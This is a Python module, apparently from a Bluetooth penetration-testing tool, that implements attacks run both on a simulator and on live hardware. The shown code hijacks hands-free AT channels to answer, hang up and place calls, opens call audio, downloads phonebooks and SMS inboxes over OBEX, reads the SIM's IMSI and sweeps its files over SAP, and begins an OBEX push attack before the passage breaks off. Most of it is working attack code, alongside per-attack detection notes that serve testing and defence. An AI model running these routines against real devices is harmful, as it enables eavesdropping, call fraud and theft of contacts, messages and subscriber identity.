"""The takeover wave: the second half of the Bluetooth imitation family.

Where the first imitation wave cloned an identity, this one takes what sits *behind* the
identity.  A Bluetooth device is a small stack of profiles — a hands-free channel that
answers AT commands, a phonebook that downloads over OBEX, an attribute table that can be
written, a link layer that accepts control PDUs, a security manager that negotiates a key
— and each of those is reachable by whoever holds the link.

Fifty attacks, grouped by the layer they take:

* **the classic profiles** — the AT channel a car kit answers on, the phonebook and the
  message store over OBEX, the serial port a printer accepts jobs on, the SIM the car kit
  reads APDUs from, the classic HID channel, the audio session.
* **the attribute table** — every writable characteristic written and read back, every
  handle walked, every characteristic fuzzed, the MTU raised, the service-changed
  characteristic used to make the host trust a table it did not have.
* **the air and the link layer** — IRK recovery from rotating addresses, advertising
  floods, connection floods, connection-interval starvation, PHY and data-length abuse,
  and the unsupported-PDU probes that separate a patched controller from a quiet one.
* **the security manager** — passkey brute force, pairing floods, OOB claims, the LE
  downgrade KNOB is about, keypress spoofing, cross-transport key derivation, key-size
  probing, bond overwriting and confirmation replay.

Everything runs against :mod:`wifipilot.blesim` in demo mode with real protocol frames —
the same decoders an offline analysis of a capture uses — and against real hardware live,
where the answers come from the operator's own target.
"""

from __future__ import annotations

import struct
from typing import Any, Dict, List, Optional, Sequence, Tuple

from .. import bt
from ..models import AccessPoint
from .base import AttackContext, AttackOutcome
from .blehid import _att_exchange, _att_read, _att_write, _enumerate
from .blemimic import _Mimic, _advertising, _entry

__all__ = ["ATTACKS", "META", "NAMES", "REGISTRY"]

#: the L2CAP signalling identifiers this wave uses: a client numbers its own requests, and
#: a peer that echoes the number is one that answers the request rather than the socket
SIGNALLING_ID = 0x01

#: the PSMs worth asking for: the ones a device that speaks a profile offers, then the two
#: dynamic ranges the specification reserves.  A connection response of "PSM not supported"
#: is the answer that says a profile is not there.
CLASSIC_PSMS: Tuple[Tuple[int, str], ...] = (
    (0x0001, "SDP"), (0x0003, "RFCOMM"), (0x0005, "TCS-BIN"), (0x0007, "TCS-BIN-CORDLESS"),
    (0x000F, "BNEP"), (0x0011, "HID Control"), (0x0013, "HID Interrupt"),
    (0x0017, "AVCTP"), (0x0019, "AVDTP"), (0x001B, "UDI-C"), (0x001D, "MCAP Control"),
    (0x001F, "ATT (BR/EDR)"), (0x1001, "dynamic start"), (0x1003, "dynamic start + 2"),
)


def _ll_pdu(opcode: int, parameters: bytes = b"") -> bytes:
    """A link-layer control PDU: one opcode byte, then the parameters."""
    return bytes([opcode]) + bytes(parameters)


class _Takeover(_Mimic):
    """Take over one of a device's own profiles, and report what it answered.

    Every attack in this wave is the same shape: aim at the device whose posture says it
    answers before it asks, talk to it over the profile it serves, and report the answer
    rather than the request.  The helpers here are the five ways of talking — the
    attribute protocol, the link layer, the security manager, RFCOMM (with AT and OBEX
    inside it) and SDP — so the attacks read like what they do.
    """

    category = "rogue"
    noise = "moderate"
    impact = "loot"
    role = "gatt"

    # -- aiming -------------------------------------------------------------- #

    def aim_at(self, role: str = "") -> Any:
        """The device this run is about: the weakest one that can answer the role."""
        airspace = self.floor()
        return airspace.pick(role or self.role) or airspace.pick("any")

    def pair(self, address: str, role: str = "") -> Tuple[Any, Any, Any]:
        """The socket, the link and the device for an address: the simulation's own.

        The socket is opened *for this address*, so a run that walks several devices in
        turn has one open link per device and the report cannot name a device while the
        controller has opened a link to another.
        """
        from .. import blesim
        airspace = self.floor()
        device = airspace.by_address(str(address)) if address else None
        link = airspace.link_for(str(address), role or self.role) if address else None
        sock = blesim.controller_socket(None, address=str(address),
                                        role=role or self.role) if address else None
        return sock, link, device

    def rows(self, address: str) -> List[Dict[str, Any]]:
        """The attribute table of a device, as the device itself describes it."""
        device = self.floor().by_address(str(address))
        return list(device.gatt_rows()) if device is not None else []

    def characteristics(self, address: str) -> List[Dict[str, Any]]:
        """Just the characteristics: what a client can read or write."""
        return [row for row in self.rows(address) if row.get("kind") == "characteristic"]

    def services(self, address: str) -> List[Tuple[int, int, int]]:
        """The primary services: start handle, end handle, UUID."""
        device = self.floor().by_address(str(address))
        return list(device.att_services()) if device is not None else []

    def handle_of(self, address: str, uuid: int) -> int:
        """The handle a device serves a characteristic on (0 when it does not)."""
        return next((int(row["handle"]) for row in self.characteristics(address)
                     if int(row.get("uuid") or 0) == int(uuid)), 0)

    # -- the attribute protocol ---------------------------------------------- #

    def att(self, address: str, body: bytes, role: str = ""
            ) -> Tuple[bytes, Dict[str, Any]]:
        """Send one ATT PDU to a device and read the answer off the ACL."""
        sock, link, _device = self.pair(address, role)
        return _att_exchange(sock, link, bytes(body))

    def att_read(self, address: str, handle: int, role: str = "") -> Tuple[bytes, Dict]:
        sock, link, _device = self.pair(address, role)
        return _att_read(sock, link, int(handle))

    def att_write(self, address: str, handle: int, value: bytes, command: bool = False,
                  role: str = "") -> Dict[str, Any]:
        sock, link, _device = self.pair(address, role)
        return _att_write(sock, link, int(handle), bytes(value), command=command)

    def write_uuid(self, address: str, uuid: int, value: bytes,
                   role: str = "") -> Dict[str, Any]:
        """Write a characteristic by UUID and read it back: the write that proves itself."""
        handle = self.handle_of(address, uuid)
        if not handle:
            return {"uuid": f"0x{int(uuid):04x}", "accepted": False,
                    "error": "no such characteristic"}
        write = self.att_write(address, handle, value, role=role)
        raw, _parsed = self.att_read(address, handle, role=role)
        return {"uuid": f"0x{int(uuid):04x}", "handle": f"0x{handle:04x}",
                "value": bytes(value).hex(), "accepted": bool(write.get("accepted")),
                "error": write.get("error", ""), "read_back": raw.hex(),
                "confirmed": bool(raw) and bytes(raw) == bytes(value)}

    def find_info(self, address: str, first: int = 0x0001, last: int = 0xFFFF,
                  role: str = "") -> List[Dict[str, Any]]:
        """Find Information: every handle and UUID in a range, as the peer describes it."""
        payload, parsed = self.att(address, bytes([0x04]) + struct.pack("<HH", first, last),
                                   role=role)
        if payload[:1] != b"\x05":
            return []
        out: List[Dict[str, Any]] = []
        body = payload[2:] if len(payload) > 2 else b""
        for offset in range(0, len(body) - 3, 4):
            handle, uuid = struct.unpack_from("<HH", body, offset)
            out.append({"handle": handle, "uuid": uuid, "uuid_text": f"0x{uuid:04x}"})
        return out

    def group_services(self, address: str, role: str = "") -> List[Dict[str, Any]]:
        """Read By Group Type: the primary services, from the peer's own table."""
        payload, _parsed = self.att(address, bytes([0x10]) + struct.pack("<HHH", 0x0001,
                                                                        0xFFFF, 0x2800),
                                    role=role)
        if payload[:1] != b"\x11":
            return []
        length = payload[1] if len(payload) > 1 else 0
        body = payload[2:]
        out: List[Dict[str, Any]] = []
        if length:
            for offset in range(0, len(body) - length + 1, length):
                start, end, uuid = struct.unpack_from("<HHH", body, offset)
                out.append({"start": start, "end": end, "uuid": uuid,
                            "uuid_text": f"0x{uuid:04x}"})
        return out

    # -- the link layer and the security manager ------------------------------ #

    def acl(self, address: str, pdu: bytes, role: str = "", timeout: float = 1.0) -> bytes:
        """Send raw ACL data to a device and return whatever came back."""
        sock, link, _device = self.pair(address, role)
        if sock is None or link is None:
            return b""
        try:
            return bt.hci_send(sock, bt.acl_packet(link.handle, bytes(pdu)),
                               timeout=timeout) or b""
        except Exception:                                        # pragma: no cover
            return b""

    def ll(self, address: str, opcode: int, parameters: bytes = b"",
           role: str = "") -> Dict[str, Any]:
        """Send a link-layer control PDU and decode the answer.

        A control PDU is not an L2CAP frame: the ACL payload *is* the PDU, and running the
        L2CAP parser over it would read the opcode's parameters as a length and a channel
        id (which is why the answer's first byte decides which parser gets it).
        """
        reply = self.acl(address, _ll_pdu(opcode, parameters), role=role)
        parsed = bt.parse_acl_packet(reply or b"")
        body = parsed.get("payload") or b""
        if body[:1] and body[0] not in bt.LL_CONTROL_OPCODES:
            body = (parsed.get("l2cap") or {}).get("payload") or body
        return {"opcode": opcode, "name": bt.LL_CONTROL_OPCODES.get(opcode, f"0x{opcode:02x}"),
                "reply": body.hex(), "reply_opcode": body[0] if body else None,
                "reply_name": bt.LL_CONTROL_OPCODES.get(body[0], "") if body else "",
                "answered": bool(body)}

    def smp(self, address: str, command: bytes, role: str = ""
            ) -> Tuple[bytes, Dict[str, Any]]:
        """Send a security-manager command on the SMP channel and decode the answer."""
        reply = self.acl(address, bt.l2cap_frame(0x0006, bytes(command)), role=role)
        body = (bt.parse_acl_packet(reply or b"").get("l2cap") or {}).get("payload") or b""
        return body, bt.parse_smp(body) if body else {}

    def link_state(self, address: str, role: str = "") -> Dict[str, Any]:
        """What the simulated link to a device looks like now: the run's own evidence."""
        _sock, link, _device = self.pair(address, role)
        if link is None:
            return {}
        return {"encrypted": bool(link.encrypted), "paired": bool(link.paired),
                "bonded": bool(link.bonded), "authenticated": bool(link.authenticated),
                "key_size": int(getattr(link, "key_size", 0) or 0),
                "alive": bool(getattr(link, "alive", True)),
                "pairing_refused": int(getattr(link, "pairing_refused", 0) or 0),
                "writes": int(getattr(link, "writes", 0) or 0),
                "att_refusals": int(getattr(link, "att_refusals", 0) or 0)}

    # -- L2CAP, RFCOMM, AT, OBEX and SDP -------------------------------------- #

    def l2cap_open(self, address: str, psm: int, role: str = "") -> Dict[str, Any]:
        """Open a dynamic channel for a PSM: the answer says whether the profile is there."""
        sock, link, _device = self.pair(address, role)
        if sock is None or link is None:
            return {"psm": int(psm), "accepted": False, "reason": "no link"}
        request = bytes([0x02, SIGNALLING_ID]) + struct.pack("<H", 4) \
            + struct.pack("<HH", int(psm), 0x0040)
        reply = self.acl(address, bt.l2cap_frame(0x0001, request), role=role)
        body = (bt.parse_acl_packet(reply or b"").get("l2cap") or {}).get("payload") or b""
        if len(body) < 12:
            return {"psm": int(psm), "accepted": False, "reason": "no answer",
                    "raw": body.hex()}
        dcid, _scid = struct.unpack_from("<HH", body, 4)
        result, _status = struct.unpack_from("<HH", body, 8)
        return {"psm": int(psm), "cid": dcid, "result": result,
                "accepted": result == 0,
                "reason": {0x0000: "accepted", 0x0001: "signalling timeout",
                           0x0002: "PSM not supported", 0x0003: "security block",
                           0x0004: "no resources"}.get(result, f"result 0x{result:04x}")}

    def psm_sweep(self, address: str, psms: Sequence[Tuple[int, str]] = CLASSIC_PSMS,
                  role: str = "") -> List[Dict[str, Any]]:
        """Ask for every PSM a profile could be behind, and keep the answers."""
        out: List[Dict[str, Any]] = []
        for psm, label in psms:
            row = self.l2cap_open(address, psm, role=role)
            row["label"] = label
            out.append(row)
        return out

    def l2cap_send(self, address: str, cid: int, payload: bytes,
                   role: str = "") -> Tuple[bytes, Dict[str, Any]]:
        """Send a frame down an already-open dynamic channel."""
        reply = self.acl(address, bt.l2cap_frame(int(cid), bytes(payload)), role=role)
        parsed = bt.parse_acl_packet(reply or b"")
        return (parsed.get("l2cap") or {}).get("payload") or b"", parsed

    def rfcomm(self, ctx: AttackContext, address: str, channel: int = 1) -> Any:
        """The simulated serial channel, or ``None`` when the device does not offer it."""
        from .. import blesim
        return blesim.rfcomm_socket(None, address=address, channel=int(channel))

    def at(self, ctx: AttackContext, address: str, command: str,
           channel: int = 1) -> Dict[str, Any]:
        """Send an AT command over the hands-free channel and read the answer."""
        sock = self.rfcomm(ctx, address, channel)
        if sock is None:
            return {"command": command, "answer": "", "connected": False,
                    "error": "no RFCOMM channel"}
        try:
            sock.send((command if command.endswith("\r") else command + "\r").encode())
            answer = sock.recv(4096).decode("latin-1", "replace")
        except Exception as exc:                                 # pragma: no cover
            return {"command": command, "answer": "", "connected": True, "error": str(exc)}
        return {"command": command, "answer": answer.strip(), "connected": True,
                "ok": "OK" in answer, "error": "ERROR" in answer,
                "lines": [line.strip() for line in answer.splitlines() if line.strip()]}

    def obex(self, ctx: AttackContext, address: str, name: str,
             channel: int = 1) -> Dict[str, Any]:
        """GET an object over OBEX: the phonebook, the message store or a named card."""
        sock = self.rfcomm(ctx, address, channel)
        if sock is None:
            return {"name": name, "bytes": 0, "connected": False}
        try:
            sock.send(bt.obex_connect())
            connected = sock.recv(4096)
            sock.send(bt.obex_get(name))
            body = sock.recv(65536)
        except Exception as exc:                                 # pragma: no cover
            return {"name": name, "bytes": 0, "connected": True, "error": str(exc)}
        return {"name": name, "bytes": len(body), "connected": True,
                "connect_response": connected.hex()[:16], "raw": body.hex()}

    def sdp(self, ctx: AttackContext, address: str) -> List[Dict[str, Any]]:
        """Browse a device's service records through its own SDP server."""
        opened = self.l2cap_open(address, 0x0001, role="sdp")
        if not opened.get("accepted"):
            return []
        request = bt.sdp_service_search_attribute()
        body, _parsed = self.l2cap_send(address, int(opened["cid"]), request, role="sdp")
        return list(bt.parse_sdp(body).get("records") or []) if body else []

    def hidp(self, ctx: AttackContext, address: str, frame: bytes,
             role: str = "classic_hid") -> bytes:
        """Send a frame on the classic HID channel (PSM 0x0013)."""
        _sock, link, _device = self.pair(address, role)
        if link is None:
            return b""
        from .. import blesim
        return blesim.ble().hidp_request(link.device, bytes(frame), link) \
            if link.device is not None else b""

    def avdtp(self, ctx: AttackContext, address: str, body: bytes,
              role: str = "audio") -> bytes:
        """Send an AVDTP signal to a device and return its answer."""
        _sock, link, _device = self.pair(address, role)
        if link is None or link.device is None:
            return b""
        from .. import blesim
        return blesim.ble().avdtp_request(link.device, bytes(body), link)

    def avrcp(self, ctx: AttackContext, address: str, body: bytes,
              role: str = "audio") -> bytes:
        """Send an AVCTP frame carrying AVRCP and return the answer."""
        _sock, link, _device = self.pair(address, role)
        if link is None or link.device is None:
            return b""
        from .. import blesim
        return blesim.ble().avrcp_request(link.device, bytes(body), link)

    def bnep(self, ctx: AttackContext, address: str, frame: bytes,
             role: str = "pan") -> bytes:
        """Send a BNEP frame to a personal-area network access point."""
        _sock, link, _device = self.pair(address, role)
        if link is None or link.device is None:
            return b""
        from .. import blesim
        return blesim.ble().bnep_request(link.device, bytes(frame), link)

    def sap(self, ctx: AttackContext, address: str, message: bytes,
            role: str = "at") -> bytes:
        """Send a SIM access profile message to a car kit and return the answer."""
        _sock, link, _device = self.pair(address, role)
        if link is None or link.device is None:
            return b""
        from .. import blesim
        return blesim.ble().sap_request(link.device, bytes(message), link)


# --------------------------------------------------------------------------- #
# 1. the classic profiles
# --------------------------------------------------------------------------- #

class BleHfpHijackAttack(_Takeover):
    """Take the hands-free channel: answer, hang up and place calls as the phone."""

    name = "ble_hfp_hijack"
    role = "at"
    label = "Bluetooth HFP hijack (answer, hang up and dial over RFCOMM)"
    category = "rogue"
    noise = "moderate"
    impact = "degraded"
    finding_severity = "high"
    tool = "wifipilot blesim.py (RFCOMM + AT)"
    devices = ("bt_headset", "bt_car_kit")

    description = (
        "The hands-free profile is an AT command channel: whoever holds the RFCOMM link "
        "can answer a call, hang one up and dial a number.  This walks the commands a car "
        "kit answers, reports each answer as the device gave it, and says which ones the "
        "channel accepted without a bonded link.")
    detection = (
        "A call answered, hung up or dialled with nobody touching the phone: the headset "
        "or car kit logs the AT channel, and the phone's call log carries the number.")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        device = self.aim_at("at")
        if device is None:
            return self._report(ctx, ap, attempt, "Bluetooth HFP hijack: nothing answers",
                                "no device on the floor offers an AT channel", {})
        commands = ("AT", "AT+CKPD=200", "AT+CHUP", "ATD+15550100;", "AT+VGS=15")
        answers = [self.at(ctx, device.address, command) for command in commands]
        accepted = [row for row in answers if row.get("ok")]
        state = self.link_state(device.address, "at")
        extra = {"device": device.to_dict(), "answers": answers,
                 "accepted": len(accepted), "commands": len(commands),
                 "call_placed": any("ATD" in row["command"] and row.get("ok")
                                    for row in answers),
                 "bonded": bool(state.get("bonded")),
                 "simulated": bool(getattr(ctx, "demo", False))}
        if accepted:
            title = (f"Bluetooth HFP hijack: {len(accepted)}/{len(commands)} AT command(s) "
                     f"accepted by {device.name}")
            typed = [row["command"] for row in accepted[:4]]
            detail = (f"the hands-free channel answered {', '.join(typed)}"
                      + (" — a call was placed on it" if extra["call_placed"] else "")
                      + f"; the link was {'bonded' if extra['bonded'] else 'open'}")
            return self._report(ctx, ap, attempt, title, detail, extra, severity="high")
        title = f"Bluetooth HFP hijack: {device.name} answered nothing"
        detail = "the RFCOMM channel exists but the AT set was refused"
        return self._report(ctx, ap, attempt, title, detail, extra, severity="info")


class BleHfpAudioGatewayAttack(_Takeover):
    """Open the audio channel a hands-free unit would: the call's own lease."""

    name = "ble_hfp_audio_gateway"
    role = "at"
    label = "Bluetooth HFP audio gateway (establish the call audio channel)"
    category = "rogue"
    noise = "moderate"
    impact = "loot"
    tool = "wifipilot blesim.py (AT + audio channel handshake)"
    devices = ("bt_car_kit", "bt_headset")

    description = (
        "An HFP call has an audio channel of its own, established by an AT command from "
        "the unit that wants it.  This asks for that channel and reports whether it was "
        "granted — a granted audio channel is the call's microphone and speaker, in a "
        "stranger's hands.")
    detection = (
        "An audio channel established without a call: the phone logs the codec negotiation "
        "and the headset logs a second channel.")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        device = self.aim_at("at")
        if device is None:
            return self._report(ctx, ap, attempt, "Bluetooth HFP gateway: nothing answers",
                                "no AT-capable device on the floor", {})
        sequence = ("AT+BCC", "AT+CMER=3,0,0,1", "AT+VGS=12", "AT+VGM=8")
        answers = [self.at(ctx, device.address, command) for command in sequence]
        accepted = [row for row in answers if row.get("ok")]
        extra = {"device": device.to_dict(), "answers": answers,
                 "channel_granted": bool(accepted), "accepted": len(accepted),
                 "simulated": bool(getattr(ctx, "demo", False))}
        title = (f"Bluetooth HFP audio: {device.name} "
                 f"{'granted the audio channel' if accepted else 'refused the audio channel'}")
        detail = (f"the unit answered {len(accepted)} of {len(sequence)} audio-setup "
                  f"command(s), which is the microphone and the speaker of the call"
                  if accepted else
                  f"all {len(sequence)} audio-setup commands were refused")
        return self._report(ctx, ap, attempt, title, detail, extra,
                            severity="high" if accepted else "info")


class BleMapHijackAttack(_Takeover):
    """Download the message store: what the phone has been sent, as a file."""

    name = "ble_map_hijack"
    role = "phone"
    label = "Bluetooth MAP hijack (download the message store)"
    category = "rogue"
    noise = "quiet"
    impact = "loot"
    finding_severity = "high"
    tool = "wifipilot blesim.py (OBEX + MAP)"
    devices = ("bt_car_kit", "smartphone")

    description = (
        "The message access profile is OBEX over RFCOMM: a client asks for a folder and "
        "the phone answers with the messages in it.  This reads the inbox listing, counts "
        "the messages and reports the sender and the text a real store hands over.")
    detection = (
        "A message download from a device that is not the car kit: the phone logs the OBEX "
        "session, and the SMS store is asked for a folder nobody's app opened.")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        device = self.aim_at("phone")
        if device is None:
            return self._report(ctx, ap, attempt, "Bluetooth MAP hijack: no phone",
                                "no device on the floor carries a message store", {})
        result = self.obex(ctx, device.address, "telecom/msg/inbox")
        raw = bytes.fromhex(str(result.get("raw") or "")) if result.get("raw") else b""
        messages = raw.count(b"BEGIN:BMSG")
        extra = {"device": device.to_dict(), "bytes": result.get("bytes", 0),
                 "messages": messages, "connected": result.get("connected", False),
                 "listing": raw.decode("latin-1", "replace")[:600] if raw else "",
                 "simulated": bool(getattr(ctx, "demo", False))}
        if messages:
            sender = ""
            text = ""
            for line in extra["listing"].splitlines():
                if line.startswith("FN:") and not sender:
                    sender = line[3:]
                if "alarm" in line.lower() or "gate" in line.lower():
                    text = line
            title = f"Bluetooth MAP hijack: {messages} message(s) downloaded"
            detail = (f"{device.name} answered the inbox with {result.get('bytes', 0)} "
                      f"byte(s) over OBEX"
                      + (f"; the first is from {sender}" if sender else "")
                      + (f" and reads {text.strip()!r}" if text else ""))
            return self._report(ctx, ap, attempt, title, detail, extra, severity="high")
        title = "Bluetooth MAP hijack: the message store did not answer"
        detail = (f"the OBEX session {'opened' if result.get('connected') else 'did not open'}"
                  f" and the inbox returned {result.get('bytes', 0)} byte(s)")
        return self._report(ctx, ap, attempt, title, detail, extra, severity="info")


class BlePbapHijackAttack(_Takeover):
    """Download the phonebook: names and numbers, card by card."""

    name = "ble_pbap_hijack"
    role = "phone"
    label = "Bluetooth PBAP hijack (download the phonebook)"
    category = "rogue"
    noise = "quiet"
    impact = "loot"
    finding_severity = "high"
    tool = "wifipilot blesim.py (OBEX + PBAP)"
    devices = ("bt_car_kit", "smartphone")

    description = (
        "The phonebook access profile is the one every car kit uses and almost nobody "
        "restricts: a vCard listing of who works here, fetched over OBEX.  This downloads "
        "it, counts the cards and reports a number from each — the directory an attacker "
        "would use for the call that follows.")
    detection = (
        "A phonebook download outside the pairing: the phone logs the PBAP session, and the "
        "listing is pulled from an address that is not the car.")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        device = self.aim_at("phone")
        if device is None:
            return self._report(ctx, ap, attempt, "Bluetooth PBAP hijack: no phone",
                                "no device on the floor carries a phonebook", {})
        result = self.obex(ctx, device.address, "telecom/pb.vcf")
        raw = bytes.fromhex(str(result.get("raw") or "")) if result.get("raw") else b""
        text = raw.decode("latin-1", "replace")
        cards = [block for block in text.split("BEGIN:VCARD") if "FN:" in block]
        contacts = []
        for block in cards:
            name = next((line[3:] for line in block.splitlines()
                         if line.startswith("FN:")), "")
            number = next((line.split(":", 1)[1] for line in block.splitlines()
                           if line.startswith("TEL")), "")
            contacts.append({"name": name, "number": number})
        extra = {"device": device.to_dict(), "bytes": result.get("bytes", 0),
                 "cards": len(cards), "contacts": contacts[:8],
                 "simulated": bool(getattr(ctx, "demo", False))}
        if cards:
            first = contacts[0] if contacts else {}
            title = f"Bluetooth PBAP hijack: {len(cards)} contact(s) downloaded"
            detail = (f"{device.name} handed the phonebook over OBEX "
                      f"({result.get('bytes', 0)} bytes)"
                      + (f"; the first card is {first.get('name')} {first.get('number')}"
                         if first else ""))
            return self._report(ctx, ap, attempt, title, detail, extra, severity="high")
        title = "Bluetooth PBAP hijack: the phonebook did not answer"
        detail = f"the OBEX session returned {result.get('bytes', 0)} byte(s)"
        return self._report(ctx, ap, attempt, title, detail, extra, severity="info")


class BleHfpIdentitySpoofAttack(_Takeover):
    """Ask the unit what it is: the model and serial number a support line would ask for."""

    name = "ble_hfp_identity_spoof"
    role = "at"
    label = "Bluetooth HFP identity read (model and serial over AT)"
    category = "discovery"
    noise = "quiet"
    impact = "info"
    tool = "wifipilot blesim.py (AT +CGMI/+CGMM/+CGSN)"
    devices = ("bt_headset", "bt_car_kit", "bt_printer")

    description = (
        "Three AT commands name a device: the manufacturer, the model and the serial "
        "number.  A serial number is an inventory key and, on some products, a default "
        "password; this reads all three off whatever answers the channel.")
    detection = (
        "An AT identity request from a device that is not the user's: the unit logs the "
        "channel, and the manufacturer's fleet system sees an unpaired client.")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        device = self.aim_at("at")
        if device is None:
            return self._report(ctx, ap, attempt, "Bluetooth HFP identity: nothing answers",
                                "no AT-capable device on the floor", {})
        answers = [self.at(ctx, device.address, command)
                   for command in ("AT+CGMI", "AT+CGMM", "AT+CGSN", "AT+CPBS?")]
        identity: Dict[str, str] = {}
        for row in answers:
            for line in row.get("lines") or []:
                if line.startswith("+CGMI"):
                    identity["vendor"] = line.split(":", 1)[-1].strip()
                elif line.startswith("+CGMM"):
                    identity["model"] = line.split(":", 1)[-1].strip()
                elif line.startswith("+CGSN"):
                    identity["serial"] = line.split(":", 1)[-1].strip()
                elif line.startswith("+CPBS"):
                    identity["phonebook_store"] = line.split(":", 1)[-1].strip()
        extra = {"device": device.to_dict(), "identity": identity, "answers": answers,
                 "simulated": bool(getattr(ctx, "demo", False))}
        title = (f"Bluetooth HFP identity: {identity.get('vendor', '?')} "
                 f"{identity.get('model', '?')}")
        detail = (f"the channel named the unit as {identity.get('model', 'unknown')} by "
                  f"{identity.get('vendor', 'an unnamed vendor')}"
                  + (f", serial {identity['serial']}" if identity.get("serial") else "")
                  + (f", with the store {identity['phonebook_store']}"
                     if identity.get("phonebook_store") else ""))
        return self._report(ctx, ap, attempt, title, detail, extra, severity="medium")


class BleSapImsiReadAttack(_Takeover):
    """Read the subscriber identity out of the SIM over the air."""

    name = "ble_sap_imsi_read"
    role = "at"
    label = "Bluetooth SAP IMSI read (the SIM's identity over RFCOMM)"
    category = "rogue"
    noise = "moderate"
    impact = "loot"
    finding_severity = "critical"
    tool = "wifipilot bt.py (SAP + APDU) + blesim.py"
    devices = ("bt_car_kit",)

    description = (
        "The SIM access profile lets a car kit talk to the phone's SIM: connect, ask for "
        "the ATR, then select and read the files that hold the subscriber identity.  This "
        "walks that exchange and reports the IMSI it *read*, decoded from the card's own "
        "encoding — a permanent identity that cannot be rotated.")
    detection = (
        "A SIM session from a device that is not the car: the phone's SIM tooling logs the "
        "APDU exchange, and the network sees the card in two places at once.")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        device = self.aim_at("at")
        if device is None or not device.flags.get("sap"):
            return self._report(ctx, ap, attempt, "Bluetooth SAP IMSI read: no SIM host",
                                "no device on the floor serves the SIM access profile", {})
        connect = bt.parse_sap(self.sap(ctx, device.address, bt.sap_message(0x00)))
        atr = bt.parse_sap(self.sap(ctx, device.address, bt.sap_message(0x06)))
        status = bt.parse_sap(self.sap(ctx, device.address, bt.sap_message(0x0E)))
        imsi = ""
        iccid = ""
        files: List[str] = []
        for file_id, length in ((0x6F07, 9), (0x6FB7, 10), (0x6F46, 17)):
            selected = bt.parse_sap(self.sap(ctx, device.address, bt.sap_message(
                0x04, bt.sap_parameter(0x06, bt.apdu_select(file_id)))))
            read = bt.parse_sap(self.sap(ctx, device.address, bt.sap_message(
                0x04, bt.sap_parameter(0x06, bt.apdu_read_binary(length)))))
            raw = str(read.get("apdu_response") or "")
            files.append(f"{file_id:04X}={raw}")
            if raw.endswith("9000") and file_id == 0x6F07:
                imsi = bt.imsi_from_ef_imsi(bytes.fromhex(raw[:-4]))
            if raw.endswith("9000") and file_id == 0x6FB7:
                iccid = bt.iccid_from_ef_iccid(bytes.fromhex(raw[:-4]))
            del selected
        extra = {"device": device.to_dict(), "connect": connect, "atr": atr, "status": status,
                 "imsi": imsi, "iccid": iccid, "files": files,
                 "simulated": bool(getattr(ctx, "demo", False))}
        if imsi:
            title = f"Bluetooth SAP IMSI read: {imsi} from {device.name}"
            detail = (f"the SIM session opened, the card's ATR answered and the card read "
                      f"back as {imsi}"
                      + (f" with ICCID {iccid}" if iccid else "")
                      + ": a subscriber identity read over the air does not need the phone")
            return self._report(ctx, ap, attempt, title, detail, extra, severity="critical")
        title = "Bluetooth SAP IMSI read: the SIM session was refused"
        detail = (f"the profile answered {str(connect.get('message_name') or 'nothing')} "
                  f"and no file was readable")
        return self._report(ctx, ap, attempt, title, detail, extra, severity="info")


class BleSapFileSweepAttack(_Takeover):
    """Sweep the SIM: every file the card publishes, and what it holds."""

    name = "ble_sap_file_sweep"
    role = "at"
    label = "Bluetooth SAP file sweep (read every SIM file)"
    category = "rogue"
    noise = "moderate"
    impact = "loot"
    finding_severity = "high"
    tool = "wifipilot bt.py (SAP constants + APDU) + blesim.py"
    devices = ("bt_car_kit",)

    description = (
        "A SIM publishes a small filesystem: the identity, the service provider name, the "
        "location area the phone is in, the ciphering key the card last used.  This reads "
        "the whole list and reports what each file gave up, including the Loci that places "
        "the handset.")
    detection = (
        "A burst of APDU selects from one session: the SIM's own log and the phone's SIM "
        "tooling both show a client walking the file table.")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        device = self.aim_at("at")
        if device is None or not device.flags.get("sap"):
            return self._report(ctx, ap, attempt, "Bluetooth SAP file sweep: no SIM host",
                                "no device on the floor serves the SIM access profile", {})
        self.sap(ctx, device.address, bt.sap_message(0x00))
        findings: List[Dict[str, Any]] = []
        for file_id, name in sorted(bt.SIM_FILES.items()):
            select = bt.parse_sap(self.sap(ctx, device.address, bt.sap_message(
                0x04, bt.sap_parameter(0x06, bt.apdu_select(file_id)))))
            selected = str(select.get("apdu_response") or "")
            if not selected.startswith("9f"):
                findings.append({"file": f"{file_id:04X}", "name": name,
                                 "status": selected, "value": ""})
                continue
            length = int(selected[2:4], 16)
            read = bt.parse_sap(self.sap(ctx, device.address, bt.sap_message(
                0x04, bt.sap_parameter(0x06, bt.apdu_read_binary(length)))))
            raw = str(read.get("apdu_response") or "")
            findings.append({"file": f"{file_id:04X}", "name": name, "status": raw[-4:],
                             "value": raw[:-4] if raw.endswith("9000") else raw})
        readable = [row for row in findings if row["value"]]
        extra = {"device": device.to_dict(), "files": findings,
                 "readable": len(readable), "asked": len(findings),
                 "simulated": bool(getattr(ctx, "demo", False))}
        if readable:
            named = ", ".join(row["name"].split(" ")[0] for row in readable[:5])
            title = f"Bluetooth SAP file sweep: {len(readable)} of {len(findings)} files read"
            detail = (f"{device.name} handed over {named}: the card's own files, read "
                      f"through the profile a car kit uses")
            return self._report(ctx, ap, attempt, title, detail, extra, severity="high")
        title = "Bluetooth SAP file sweep: the card answered nothing"
        detail = f"{len(findings)} file(s) asked for and none readable"
        return self._report(ctx, ap, attempt, title, detail, extra, severity="info")


class BleObexPushAttack(_Takeover):
    """Push an object to a device: the profile that accepts a file from a stranger."""

    name = "ble_obex_push"
    role = "obex"
    label = "Bluetooth OBEX push (send an object to an object store)"
    category = "rogue"
    noise = "moderate"
    impact = "loot"
    tool = "wifipilot blesim.py (OBEX PUT)"
    devices = ("bt_printer", "smartphone")

    description = (
        "Object push is the oldest Bluetooth profile and the most permissive: connect to "
        "the object store and hand it a file.  This pushes a vCard carrying a name and a "
        "number, then reports whether the store accepted it — a business card is how a "
        "contact lands in somebody's phonebook without being asked for.")
    detection = (
        "An OBEX push from an unpaired sender: the receiving device shows the incoming "
